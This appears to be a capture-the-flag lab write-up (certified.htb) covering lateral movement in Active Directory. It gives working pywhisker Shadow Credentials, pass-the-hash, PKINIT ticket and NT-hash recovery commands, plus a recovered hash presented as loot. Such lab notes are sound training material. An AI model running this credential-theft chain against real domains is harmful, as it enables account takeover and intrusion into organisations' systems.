# 05 - Lateral Movement: CA_OPERATOR (GenericAll)

Objective: Compromise the `ca_operator` account to prepare the attack against ADCS.

Attack Path: MANAGEMENT_SVC $\xrightarrow{\text{GenericAll}}$ CA_OPERATOR

Current Credential: NTLM hash of `management_svc` (obtained in note [[04-shadow-creds-management.md]]).

## 🧩 Analysis (CPTS)

BloodHound shows that our current user (`management_svc`) has **GenericAll** over `ca_operator`.

- **GenericAll** grants full control, including the right to reset the password.

- **Strategy:** Instead of resetting the password (which would be destructive and noisy), we will use **Shadow Credentials** again to inject a key and gain access stealthily.

- **Technical difference:** This time we will use **Pass-the-Hash** with `pywhisker`, authenticating with the hash of `management_svc` instead of a cleartext password.

## 1. Credential Injection (Pass-the-Hash)

We run `pywhisker` using our current user's NTLM hash (`-H`) to attack the target (`--target`).

```bash
# Syntax: -u [USER] -H [NTLM_HASH] --target [VICTIM] --action "add"
# Replace <HASH_MANAGEMENT_SVC> with the hash you obtained in the previous note (approx: a091c1...)

python3 /opt/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "management_svc" -H <HASH_MANAGEMENT_SVC> --target "ca_operator" --action "add"
```

![](<attachments/Pasted image 20260105122315.png>)

- **Result:** You will get a new `.pfx` file and a new password.

- _Note:_ If you get a write-permissions error again, make sure you are in your home directory (`cd ~`).

## 2. Getting the TGT (PKINIT)

We use the newly generated certificate for `ca_operator`.

```bash
# Replace <NEW_PFX> and <NEW_PASS>
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx <NEW_PFX> -pfx-pass '<NEW_PASS>' certified.htb/ca_operator ca_operator.ccache
```

- **Result:** The file `ca_operator.ccache` is created.

- **Critical detail:** Copy the `AS-REP encryption key` printed on screen.

![](<attachments/Pasted image 20260105122523.png>)

## 3. NTLM Hash Recovery

We decrypt the ticket’s PAC to recover the user’s NTLM hash.

```bash
export KRB5CCNAME=ca_operator.ccache

# Use the AS-REP Key from step 2
python3 /opt/PKINITtools/getnthash.py -key <NEW_AS_REP_KEY> certified.htb/ca_operator
```

- **Result:** `Recovered NT Hash: b4b86f45c6018f1b664f70805f45d8f2` (verify it matches yours)

![](<attachments/Pasted image 20260105122551.png>)

---

**Current Status:**

- **Compromised user:** `ca_operator`

- **Loot:** NTLM hash (`b4b86f45c6018f1b664f70805f45d8f2`).

- **Why not WinRM?** Even if we could log in, the real value of this user is its permission over the certificate infrastructure.

- **Next step:** Use this hash to enumerate and exploit the ESC9 vulnerability in the note [[06-enum-adcs-certipy]].
